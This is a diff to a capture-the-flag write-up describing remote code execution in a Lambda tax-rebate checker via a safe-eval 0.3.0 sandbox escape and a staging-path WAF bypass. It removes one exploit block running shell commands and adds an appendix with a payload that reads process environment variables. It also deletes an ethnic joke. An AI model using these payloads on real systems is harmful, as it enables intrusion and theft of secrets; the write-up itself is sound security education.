@@ -52,7 +52,7 @@ Et voilá!
 We can see that the website sends a POST request to
 
 ```
-https://cors-anywhere.herokuapp.com/ (this part useless like Asian child who cannot get full marks.)
+https://cors-anywhere.herokuapp.com/
 
 https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker (actual API endpoint)
 ```
@@ -98,27 +98,6 @@ As the application was running on Node.js, we can find the dependencies in `pack
 
 Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. (to add: explain what the person is doing. why does this bypass safe-eval?)
 
-```javascript
-const safeEval = require('safe-eval');
-
-const theFunction = function() {
-   const bad = new Error(); //Error() object
-   bad.__proto__ = null; // Sorry I am not a javascript programmer.
-   bad.stack = { //Error stacktrace
-      match(outer) { //outer i.e. theFunction()
-         throw outer.constructor.constructor("return process")().mainModule.require('child_process').execSync('whoami').toString();
-         //There are 2 constructors???
-         // I mean, at least the exploit is pretty clear in that you spawn a child process and execute arbitrary commands
-         
-      }
-   };
-   return bad;
-};
-
-const untrusted = `(${theFunction})()`;
-console.log(safeEval(untrusted));
-```
-
 ## Exploiting the Exploit
 
 To recap, we just need to switch from `prod` to `staging` in the API URL, to bypass the WAF: https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker. _(easiest WAF bypass on earth: done)_
@@ -150,7 +129,7 @@ We found an example payload [here](https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076)
 We just need to replace `whoami` with our preferred shell command to run arbitrary commands.
 
 ## Finding the flag
-_([skip to solution](#solution))_ (hmm, should this be here?)
+_([skip to solution](#solution))_
 
 Now we are in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.
 
@@ -241,3 +220,53 @@ vdir wait wc who whoami yes
 This is because the Lambda image is built to be tiny and quick to deploy, because these instances can be created and destroyed in a matter of minutes.
 
 To run other commands, they must be packaged with the function, put in a Lambda layer, or by using a [self-made container](https://aws.amazon.com/en/about-aws/whats-new/2020/12/aws-lambda-now-supports-container-images-as-a-packaging-format/).
+
+## Appendix B: Post-event recon
+We decided to look into how the exploit actually worked after the CTF.
+
+Looking at `safe-eval`'s source code, it seems like it achieves sandboxing simply by using the `vm` module in Node.js (code from v0.3.0):
+
+```js
+var vm = require('vm')
+
+module.exports = function safeEval (code, context, opts) {
+  var sandbox = {}
+  var resultKey = 'SAFE_EVAL_' + Math.floor(Math.random() * 1000000)
+  sandbox[resultKey] = {}
+  code = resultKey + '=' + code // your code becomes SAVE_EVAL_177013 = age + salary * 3.14...
+  if (context) { // add the supplied context to the code
+    Object.keys(context).forEach(function (key) {
+      sandbox[key] = context[key]
+    })
+  }
+  vm.runInNewContext(code, sandbox, opts) // we're already running untrusted code?
+  return sandbox[resultKey] // return SAVE_EVAL_177013
+}
+```
+
+As the Node.js docs state,
+> **The `vm` module is not a security mechanism. Do not use it to run untrusted code.**
+
+Therefore, we were able to break out the sandbox very easily simply by using known attacks against directly against the built-in `vm` module. The following payload would have been sufficient:
+
+```js
+this.constructor.constructor("return process")().env
+```
+
+For some reason, in a VM, `this.constructor.constructor("<code>")()` runs a function in the scope of the parent function (understanding this would require looking into the source of `vm`/`contextify`/`V8`, and I am lazy and unqualified). This allows the attacker to basically run any Node.js code they would like to.
+
+The fix that safe-eval deployed was to delete all functions from the constructor:
+
+```js
+(function() {
+  Function = undefined;
+  const keys = Object.getOwnPropertyNames(this).concat(['constructor']);
+  keys.forEach((key) => {
+    const item = this[key];
+    if (!item || typeof item.constructor !== 'function') return;
+    this[key].constructor = undefined;
+  });
+})();
+```
+
+But considering how long `vm2`'s source code is, yet still having [security issues](https://github.com/patriksimek/vm2/issues/241), the effectiveness of such a fix is still in question.
